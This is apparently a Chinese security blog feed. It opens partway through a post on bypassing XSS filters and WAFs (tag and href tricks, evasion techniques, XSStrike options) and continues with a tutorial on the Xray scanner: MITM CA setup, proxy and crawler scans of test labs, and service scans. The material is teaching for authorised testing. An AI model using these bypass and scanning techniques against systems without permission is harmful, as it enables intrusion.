<li>尝试大小写绕过不行后，利用XSS平台，发现后面<code>&lt;/h2&gt;</code>的<code>&gt;</code>把前面的给包起来了，导致访问的链接拼接了<code>&lt;/h2</code></li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643509923900-3261d463-6ceb-4c53-b9df-16428871e95b.png" alt="img"></p>
<ol start="5">
<li>使用引号包裹链接即可</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643509972011-de51deea-0641-4602-9f97-59a530ecc919.png" alt="img"></p>
<ol start="6">
<li>使用超链接也可以，但是<code>&lt;a href=xxx&gt;</code>猜测也就会检测href，而事实也确实如此，只需要在href前加/即可绕过，也不影响语义，而之所以加/能绕过，是因为在前端中/经常出现在闭合的后标签，加上后就会让waf误以为是结束标签</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643510401053-2d11165e-a294-444a-b947-33630758e13b.png" alt="img"></p>
<h1 id="四、常规Waf绕过思路"><a href="#四、常规Waf绕过思路" class="headerlink" title="四、常规Waf绕过思路"></a>四、常规Waf绕过思路</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 标签语法替换</span><br><span class="line">[+] 特殊符号干扰    比如 / #</span><br><span class="line">[+] 提交方式更改    Request的前提下，Waf只检查URL内容而不检查POST内容</span><br><span class="line">[+] 垃圾数据溢出    </span><br><span class="line">[+] 加密解密算法</span><br><span class="line">[+] 结合其他漏洞绕过</span><br></pre></td></tr></table></figure>

<h1 id="五、XSS自动化工具"><a href="#五、XSS自动化工具" class="headerlink" title="五、XSS自动化工具"></a>五、XSS自动化工具</h1><h2 id="1、Xwaf"><a href="#1、Xwaf" class="headerlink" title="1、Xwaf"></a>1、Xwaf</h2><p>&emsp;&emsp;下载链接：<a href="https://github.com/3xp10it/xwaf">https://github.com/3xp10it/xwaf</a></p>
<p>&emsp;&emsp;现在作者貌似不再维护该项目了</p>
<h2 id="2、XSStrike"><a href="#2、XSStrike" class="headerlink" title="2、XSStrike"></a>2、XSStrike</h2><p>&emsp;&emsp;下载链接：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSStrike 主要特点：</span><br><span class="line">[+] 反射和 DOM XSS 扫描</span><br><span class="line">[+] 多线程爬虫</span><br><span class="line">[+] Context 分析</span><br><span class="line">[+] 可配置的核心</span><br><span class="line">[+] 检测和规避 WAF</span><br><span class="line">[+] 老旧的 JS 库扫描</span><br><span class="line">[+] 智能 payload 生成器</span><br><span class="line">[+] 手工制作的 HTML &amp; JavaScript 解析器</span><br><span class="line">[+] 强大的 fuzzing 引擎</span><br><span class="line">[+] 盲打 XSS 支持</span><br><span class="line">[+] 高效的工作流</span><br><span class="line">[+] 完整的 HTTP 支持</span><br><span class="line">[+] Bruteforce payloads 支持</span><br><span class="line">[+] Payload 编码</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;相关参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure>

<h1 id="六、Fuzzing测试"><a href="#六、Fuzzing测试" class="headerlink" title="六、Fuzzing测试"></a>六、Fuzzing测试</h1><ul>
<li>在线生成Fuzzing字典：<a href="https://xssfuzzer.com/fuzzer.html">XSS Fuzzer</a></li>
<li>Fuzzing字典：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></li>
</ul>
<h1 id="七、XSS（带过滤）靶场实战"><a href="#七、XSS（带过滤）靶场实战" class="headerlink" title="七、XSS（带过滤）靶场实战"></a>七、XSS（带过滤）靶场实战</h1><ul>
<li><p><a href="https://www.yuque.com/docs/share/ad406668-69f3-4ac4-bde4-ec2ef0f2ae9f#">Xss-labs</a></p>
</li>
<li><p><a href="https://www.yuque.com/docs/share/e0fb2c24-dbef-4174-8d44-eb6f4a164246#">Xss靶场通关</a></p>
</li>
<li><p><a href="https://gitee.com/yhtmxl/imxss/">Java Xss测试平台</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Xray：一款自动化Web漏洞扫描神器</title>
    <url>/post/60ade18e.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Xray简介"><a href="#一、Xray简介" class="headerlink" title="一、Xray简介"></a>一、Xray简介</h1><p>&emsp;&emsp;xray 是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows、macOS、Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。</p>
<ul>
<li>Github地址：<a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></li>
</ul>
<h1 id="二、特色"><a href="#二、特色" class="headerlink" title="二、特色"></a>二、特色</h1><ul>
<li><p>使用 go 语言编写，跨平台、纯异步、无阻塞，并发能力强，扫描速度杠杠的</p>
</li>
<li><p>提供多种使用方式，调用姿势方便，输入输出非常标准化，极具可集成性</p>
</li>
<li><p>使用 YAML 配置文件非常方便地定义 POC，可以快速扩展扫描能力</p>
</li>
<li><p>全程使用无害 POC 进行探测，在确保能发现漏洞的基础上不会给业务带来严重影响，非常适用于企业内部安全建设</p>
</li>
<li><p>命令行式的免费被动扫描工具，不多见</p>
</li>
<li><p>自备盲打平台，可检测需要反连才能触发的漏洞，如：存储型 XSS、无回显的 SSRF、XXE、命令注入等</p>
</li>
<li><p>更新速度快，用着不爽可以在 github 提需求，很快就能解决（我试过了，是真的）</p>
</li>
</ul>
<h1 id="三、使用人群"><a href="#三、使用人群" class="headerlink" title="三、使用人群"></a>三、使用人群</h1><ul>
<li><p>白帽子。挖 SRC 必备，打开浏览器挂上代理，然后上网冲浪等漏洞就对了，还不够的话就把代理给你爸妈、给你妹子、给你家猫都挂上</p>
</li>
<li><p>甲方安全建设者。工具在手，天下我有，细粒度配置，高精度扫描，可作为定期巡检、常规扫描的辅助神器</p>
</li>
<li><p>乙方工具开发者。在编写渗透框架或者漏洞扫描框架时，作为扫描探针进行集成，简直是大平台中的小尖刀</p>
</li>
</ul>
<h1 id="四、基于代理的被动扫描"><a href="#四、基于代理的被动扫描" class="headerlink" title="四、基于代理的被动扫描"></a>四、基于代理的被动扫描</h1><p>&emsp;&emsp;代理模式下的基本架构为，扫描器作为中间人，首先原样转发流量，并返回服务器响应给浏览器等客户端，通讯两端都认为自己直接与对方对话，同时记录该流量，然后修改参数并重新发送请求进行扫描。这种原理和 Burpsuite 的自带的漏扫原理是一样的。</p>
<h2 id="1、生成CA证书"><a href="#1、生成CA证书" class="headerlink" title="1、生成CA证书"></a>1、生成CA证书</h2><p>&emsp;&emsp;需要注意一下的是，很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的 ca.crt 证书，关于如何导入 CA 证书，请打开百度搜索 “安装CA证书”。</p>
<p>&emsp;&emsp;在浏览器使用 https 协议通信的情况下，必须要得到客户端的信任，才能建立与客户端的通信。</p>
<p>&emsp;&emsp;这里的突破口就是 ca 证书。只要自定义的 ca 证书得到了客户端的信任，xray 就能用该 ca 证书签发各种伪造的服务器证书，从而获取到通信内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">【Windows】</span><br><span class="line">.\xray_windows_amd64.exe genca</span><br><span class="line"></span><br><span class="line">【Linux】</span><br><span class="line">./xray_linux_amd64 genca</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;运行命令之后，将在当前文件夹生成 ca.crt 和 ca.key 两个文件。</p>
<p>&emsp;&emsp;本命令只需要第一次使用的时候运行即可，如果文件已经存在再次运行会报错，需要先删除本地的 ca.crt 和 ca.key 文件。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644836889998-050fbe18-7418-4f81-88ee-5d1aa20dddca.png" alt="img"></p>
<h2 id="2、安装CA证书"><a href="#2、安装CA证书" class="headerlink" title="2、安装CA证书"></a>2、安装CA证书</h2><h3 id="（1）Firefox"><a href="#（1）Firefox" class="headerlink" title="（1）Firefox"></a>（1）Firefox</h3><p>&emsp;&emsp;如果使用的是 FireFox 浏览器，它有自己的证书体系。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644837090242-3c33f4f3-0c76-45ad-a5a1-6645633fc639.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644837115325-226ea205-452d-48f9-8cf6-6313d812265e.png" alt="img"></p>
<h3 id="（2）其他"><a href="#（2）其他" class="headerlink" title="（2）其他"></a>（2）其他</h3><p>&emsp;&emsp;如果使用的是 IE、Chrome、curl 等客户端，建议将 ca 证书安装在操作系统上，请根据不同的操作系统，选择参照下方的教程。</p>
<h4 id="①-Windows"><a href="#①-Windows" class="headerlink" title="① Windows"></a>① Windows</h4><p>&emsp;&emsp;双击 ca.crt，然后按照下图的步骤操作。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844802600-b9513981-5bd2-47df-893c-79c9de065089.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844802543-359390f1-8f87-4909-99c1-5b8611aa3629.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844802487-8af06c0e-4307-44cb-bf2d-835e6fd2be3a.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844802432-0366537d-4dc5-41fa-a8a3-c4e870ce301c.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844802522-a0580693-598b-400d-8455-4e41f9449442.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844803435-49169bfa-1be6-442b-9484-58c206061f62.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844803724-cc70e4cd-bb7a-4b6f-b056-efe19193ab1f.png" alt="img"></p>
<h4 id="②-Linux"><a href="#②-Linux" class="headerlink" title="② Linux"></a>② Linux</h4><p>&emsp;&emsp;将 ca.crt 复制到 <code>/usr/local/share/ca-certificates/</code>，然后执行 <code>update-ca-certificates</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp ca.crt /usr/<span class="built_in">local</span>/share/ca-certificates/xray.crt</span><br><span class="line">sudo update-ca-certificates</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844922500-53c22402-c0d1-41bf-b4de-66c609cc7647.png" alt="img"></p>
<h4 id="③-MacOS"><a href="#③-MacOS" class="headerlink" title="③ MacOS"></a>③ MacOS</h4><p>&emsp;&emsp;双击 ca.crt，然后按照下图的步骤操作。</p>
<p>&emsp;&emsp;右上角搜索 x-ray，可以看到一条记录，有一个红叉，被标记为不受信任的。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844969912-8836778e-c99e-4db9-b5d7-e0eb6581cea1.png" alt="img"></p>
<p>&emsp;&emsp;然后双击这条记录，将 SSL 那一项改为始终信任，然后点击左上角关闭窗口，输入密码授权。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844970211-37fdcacc-42b9-40d0-86cf-2553eeb00273.png" alt="img"></p>
<h4 id="④-Android"><a href="#④-Android" class="headerlink" title="④ Android"></a>④ Android</h4><p>&emsp;&emsp;可以将 ca.crt 文件传送到手机上，然后打开</p>
<p>&emsp;&emsp;或者参考下面的步骤，将手机配置代理之后，使用浏览器访问 <a href="http://xray/">http://xray/</a> 然后点击下载 ca 证书，然后再安装。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844997965-d5997b54-e0d3-4d4d-b84a-02baa6ece40a.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644844997741-4bc7980c-98e1-4622-a369-c161cf397711.png" alt="img"></p>
<h4 id="⑤-IOS"><a href="#⑤-IOS" class="headerlink" title="⑤ IOS"></a>⑤ IOS</h4><p>&emsp;&emsp;可以将 ca.crt 文件传送到手机上，然后点击打开打开。</p>
<p>&emsp;&emsp;或者参考后续的步骤，将手机配置代理之后，使用浏览器访问 <a href="http://xray/">http://xray/</a> 然后点击下载 ca 证书，然后再安装。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845032716-84198a8f-a8df-49ff-afc4-e98206041977.png" alt="img"></p>
<p>&emsp;&emsp;然后去设置首页，查看下载的描述文件。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845032794-7632bc18-1011-4659-9d12-0954dd227bfa.png" alt="img"></p>
<p>&emsp;&emsp;点击右上角安装，输入密码授权。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845032715-9759eda8-906a-4243-bf60-07a1e82e03f6.png" alt="img"></p>
<p>&emsp;&emsp;点击通用设置-关于，在最后一项证书信任设置中，将 Insecure Root CA For X-Ray Scanner 一项的开关打开。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845032648-2fa6f58f-7a48-42df-9fae-c3f1e161e57f.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845032719-899388ac-e019-4f88-8852-2ede0896121b.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845033915-79843782-1fbd-4d15-86e4-eda9c9fa1dbe.png" alt="img"></p>
<h2 id="3、启动代理"><a href="#3、启动代理" class="headerlink" title="3、启动代理"></a>3、启动代理</h2><p>&emsp;&emsp;在扫描之前，我们还需要做一些必要的设置</p>
<p>&emsp;&emsp;第一次启动 xray 之后，当前目录会生成 <code>config.yml</code> 文件，选择文件编辑器打开，并按照下方说明修改。（这里我就不改了）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mitm:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">restriction:</span>                          </span><br><span class="line">    <span class="attr">hostname_allowed:</span>                   <span class="comment"># 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">testphp.vulnweb.com</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845440706-4d27656c-bfc2-40ee-b747-fc0361a449c0.png" alt="img"></p>
<p>&emsp;&emsp;因为我们的测试目标站就是 <code>http://testphp.vulnweb.com</code>，增加这个过滤之后，xray 将只会扫描该站的流量，避免扫描到非授权目标站点。</p>
<ul>
<li>设定漏洞扫描结果的输出，这里选择使用 html 文件输出，所以命令行后面要增加 <code>--html-output xray-testphp.html</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--text-output：输出到文本文件中</span><br><span class="line">--json-output：输出到JSON文件中</span><br><span class="line">--html-output：输出到HTML文件中</span><br></pre></td></tr></table></figure>

<blockquote>
<p>xray 配置文件中默认不允许扫描 gov 和 edu 等网站，如果想对这些网站进行<strong>授权测试</strong>，需要移除 <code>hostname_disallowed</code> 的相关配置才可以。严禁未授权的测试！否则后果自负。  </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./xray_linux_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845670878-30e2633f-cdca-489a-9a1d-50f237e5d99d.png" alt="img"></p>
<p><strong>【常见问题】</strong></p>
<ul>
<li>如何退出？ctrl + c</li>
<li>提示 <code>file xray-testphp.html already exists</code>，可以删除已经存在的报告文件，或者使用一个新的文件名，或者在文件名中加入 <code>__timestamp__</code> 或 <code>__datetime__</code> 将自动替换为实际值。</li>
</ul>
<h2 id="4、配置代理"><a href="#4、配置代理" class="headerlink" title="4、配置代理"></a>4、配置代理</h2><h3 id="（1）Edge"><a href="#（1）Edge" class="headerlink" title="（1）Edge"></a>（1）Edge</h3><p>&emsp;&emsp;按照下图的步骤操作</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845780168-3838328e-6ba7-47b0-8c9f-605a5d845151.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845779817-a8b99e6d-a121-4efc-aa06-4e9c32317322.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845779879-93a58a29-6855-4e73-9631-75e1453fa995.png" alt="img"></p>
<h3 id="（2）Chrome"><a href="#（2）Chrome" class="headerlink" title="（2）Chrome"></a>（2）Chrome</h3><p>&emsp;&emsp;Chrome 可以使用操作系统的代理配置，同时也可以使用插件控制，这里推荐使用插件，可以更加灵活的去配置代理。</p>
<p>&emsp;&emsp;首先点击 <a href="https://chrome.google.com/webstore/detail/padekgcemlokbadohgkifijomclgjgif">Chrome Store</a></p>
<p>&emsp;&emsp;然后点击同意相关的协议和权限申请弹框，这样就可以在 Chrome 浏览器的右上角看到一个圆形图标的插件了。</p>
<p>&emsp;&emsp;新建情景模式，命名为 xray，然后 todo todo</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845803808-cfe9e616-f278-4bdf-a2b1-68a541951dc2.png" alt="img"></p>
<p>&emsp;&emsp;选择 xray 模式，这样 Chrome 就会使用 xray 作为代理了。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845803745-edd9da32-ca80-4d0a-bbb6-a95dbe30ad76.png" alt="img"></p>
<h3 id="（3）Firefox"><a href="#（3）Firefox" class="headerlink" title="（3）Firefox"></a>（3）Firefox</h3><p>&emsp;&emsp;不再赘述</p>
<h3 id="（4）IOS"><a href="#（4）IOS" class="headerlink" title="（4）IOS"></a>（4）IOS</h3><p>&emsp;&emsp;按照下图的步骤操作</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845863986-fd57f4d4-1a3e-40f0-b722-42a0dc3304ca.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845863995-d47d0a23-b78e-4692-94ae-8ca579e24b46.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644845863907-48647afc-ba73-4098-bdd8-5f86a1995039.png" alt="img"></p>
<h3 id="（5）Android"><a href="#（5）Android" class="headerlink" title="（5）Android"></a>（5）Android</h3><p>&emsp;&emsp;不再赘述</p>
<h2 id="5、开始扫描"><a href="#5、开始扫描" class="headerlink" title="5、开始扫描"></a>5、开始扫描</h2><p>&emsp;&emsp;使用浏览器访问自己的pikachu靶场，然后就可以看到 xray 界面开始输出漏洞信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644846972790-35686109-8fd9-4e2b-9d99-ffd6cf4a8fe7.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644847006259-515996c8-d9eb-4910-a866-386a93cc8fa8.png" alt="img"></p>
<h1 id="五、使用xray基础爬虫模式进行漏洞扫描"><a href="#五、使用xray基础爬虫模式进行漏洞扫描" class="headerlink" title="五、使用xray基础爬虫模式进行漏洞扫描"></a>五、使用xray基础爬虫模式进行漏洞扫描</h1><p>&emsp;&emsp;爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，和代理模式不同的是，爬虫不需要人工的介入，访问速度要快很多，但是也有一些缺点需要注意</p>
<ul>
<li>xray 的基础爬虫不能处理 js 渲染的页面，如果需要此功能，请参考 <a href="https://docs.xray.cool/#/generic/compare">版本对比</a></li>
</ul>
<h2 id="1、启动爬虫"><a href="#1、启动爬虫" class="headerlink" title="1、启动爬虫"></a>1、启动爬虫</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./xray_linux_amd64 webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这可能是最简单最常用的一个功能，就是太长了，体验不太友好，建议常用的同学可以 <code>alias xray=&quot;/path/xray webscan --basic-crawler&quot;</code></p>
</blockquote>
<p>&emsp;&emsp;比如对pikachu靶场中的XSS进行扫描</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644843390644-1839cea2-7046-4495-809c-d6ca47c72df8.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644843410374-750e1393-fe4d-4849-b5da-5887d7a82190.png" alt="img"></p>
<h2 id="2、登录后的网站扫描"><a href="#2、登录后的网站扫描" class="headerlink" title="2、登录后的网站扫描"></a>2、登录后的网站扫描</h2><p>&emsp;&emsp;如果用的是代理模式，只要浏览器是登录状态，那么漏洞扫描收到的请求也都是登录状态的请求。但对于普通爬虫而言，就没有这么“自动化”了， 但是可以通过配置 Cookie 的方式实现登录后的扫描。</p>
<p>&emsp;&emsp;打开配置文件，修改 http 配置部分的 Headers 项：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="attr">headers:</span></span><br><span class="line">    <span class="attr">Cookie:</span> <span class="string">key=value</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上述配置将为所有请求（包括爬虫和漏洞扫描）增加一条 Cookie <code>key=value</code></p>
<h1 id="六、使用xray进行服务扫描"><a href="#六、使用xray进行服务扫描" class="headerlink" title="六、使用xray进行服务扫描"></a>六、使用xray进行服务扫描</h1><p>&emsp;&emsp;xray 中最常见的是 web 扫描，但是 xray 将会逐渐开放服务扫描的相关能力，目前主要是服务扫描相关的 poc。老版本升级的用户请注意配置文件需要加入服务扫描的相关 poc 名字，目前只有一个 tomcat-cve-2020-1938 ajp 协议任意文件检测 poc。</p>
<p>&emsp;&emsp;参数配置目前比较简单，输入支持两种方式，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">快速检测单个目标</span><br><span class="line">./xray servicescan --target 127.0.0.1:8009</span><br><span class="line"></span><br><span class="line">批量检查的 1.file 中的目标, 一行一个目标，带端口</span><br><span class="line">./xray servicescan --target-file 1.file </span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其中 1.file 的格式为一个行一个 service，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.3.0.203:8009</span><br><span class="line">127.0.0.1:8009</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;也可以将结果输出到报告或json文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">将检测结果输出到 html 报告中</span><br><span class="line">./xray servicescan --target 127.0.0.1:8009 --html-output service.html</span><br><span class="line">./xray servicescan --target-file 1.file --html-output service.html</span><br><span class="line"></span><br><span class="line">将检测结果输出到 json 文件中</span><br><span class="line">./xray servicescan --target 127.0.0.1:8099 --json-output 1.json </span><br><span class="line">NAME:</span><br><span class="line">    servicescan - Run a service scan task</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">    servicescan [<span class="built_in">command</span> options] [arguments...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   --target value       specify the target, <span class="keyword">for</span> example: host:8009</span><br><span class="line">   --target-file value  load targets from a <span class="built_in">local</span> file, one target a line</span><br><span class="line">   --json-output FILE   output xray results to FILE <span class="keyword">in</span> json format</span><br><span class="line">   --html-output FILE   output xray result to `FILE` <span class="keyword">in</span> HTML format</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;以 tomcat CVE-2020-1938 ajp 协议任意文件读取为例，命令行如下图。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644847335818-30af1ef5-830f-4568-bd46-5a00762f78e9.svg" alt="img"></p>
<h1 id="七、高级用法"><a href="#七、高级用法" class="headerlink" title="七、高级用法"></a>七、高级用法</h1><h2 id="1、启用部分扫描插件"><a href="#1、启用部分扫描插件" class="headerlink" title="1、启用部分扫描插件"></a>1、启用部分扫描插件</h2><p>&emsp;&emsp;使用 <code>--plugins</code> 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./xray webscan --plugins cmd_injection --url http://example.com/</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;目前提供的插件列表如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] SQL 注入检测 (key: sqldet)：支持报错注入、布尔注入和时间盲注等XSS 检测（key: xss）</span><br><span class="line">[+] 支持扫描反射型、存储型 XSS命令/代码注入检测 (key: cmd_injection)</span><br><span class="line">[+] 支持 shell 命令注入、PHP 代码执行、模板注入等目录枚举 (key: dirscan)</span><br><span class="line">[+] 检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件路径穿越检测 (key: path_traversal)</span><br><span class="line">[+] 支持常见平台和编码XML 实体注入检测 (key: xxe)</span><br><span class="line">[+] 支持有回显和反连平台检测POC 管理 (key: phantasm)</span><br><span class="line">[+] 默认内置部分常用的 POC，用户可以根据需要自行构建 POC 并运行。可参考：POC 编写文档文件上传检测 (key: upload)</span><br><span class="line">[+] 支持检测常见的后端服务器语言的上传漏洞弱口令检测 (key: brute_force)</span><br><span class="line">[+] 支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典JSONP 检测 (key: jsonp)</span><br><span class="line">[+] 检测包含敏感信息可以被跨域读取的 jsonp 接口SSRF 检测 (key: ssrf)</span><br><span class="line">[+] ssrf 检测模块，支持常见的绕过技术和反连平台检测基线检查 (key: baseline)</span><br><span class="line">[+] 检测低 SSL 版本、缺失的或错误添加的 http 头等任意跳转检测 (key: redirect)</span><br><span class="line">[+] 支持 HTML meta 跳转、30x 跳转等CRLF 注入 (key: crlf_injection)</span><br><span class="line">[+] 检测 HTTP 头注入，支持 query、body 等位置的参数</span><br></pre></td></tr></table></figure>

<h2 id="2、只扫描一个URL"><a href="#2、只扫描一个URL" class="headerlink" title="2、只扫描一个URL"></a>2、只扫描一个URL</h2><p>&emsp;&emsp;xray 还提供了方便的只扫描一个 URL 的方式，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./xray webscan --url http://example.com/ --json-output out.json</span><br></pre></td></tr></table></figure>

<h2 id="3、配置文件"><a href="#3、配置文件" class="headerlink" title="3、配置文件"></a>3、配置文件</h2><p>&emsp;&emsp;xray 还提供了友好配置文件，可以方便地将常用的命令行参数写到配置文件中，避免了每次都要输入一大串参数的痛苦。</p>
<p>&emsp;&emsp;xray 默认会读取运行目录下的 config.yaml 文件作为配置文件，也可以使用 <code>--config</code> 参数指定其他配置文件。</p>
<p>&emsp;&emsp;关于命令行的详细配置可以参考 <a href="https://docs.xray.cool/#/guide/config">xray 官方文档</a>。</p>
<h2 id="4、反连平台"><a href="#4、反连平台" class="headerlink" title="4、反连平台"></a>4、反连平台</h2><p>&emsp;&emsp;xray 在运行时会自动启动反连平台来辅助盲打扫描，可以在配置文件中修改反连平台的配置。目前支持 http 和 dns 两种反连机制，当服务端触发 payload 时 xray 会根据反连平台的状态判断漏洞是否存在。</p>
<blockquote>
<p>dns 反连需要启用 root 权限监听 53 端口，并且将域名的 ns 记录指向反连平台的监听地址</p>
</blockquote>
<h2 id="5、自定义POC"><a href="#5、自定义POC" class="headerlink" title="5、自定义POC"></a>5、自定义POC</h2><p>&emsp;&emsp;xray 支持用户使用 YAML 编写 POC。YAML 是JSON 的超集，也就是说我们甚至可以用 JSON 编写 POC，但这里还是建议大家使用 YAML 来编写，原因如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] YAML 格式的 “值” 无需使用双引号包裹，特殊字符无需转义</span><br><span class="line">[+] YAML 格式使内容更加可读</span><br><span class="line">[+] YAML 中可以使用注释</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们可以编写以下的 yaml 来测试 tomcat put 上传任意文件漏洞：</p>
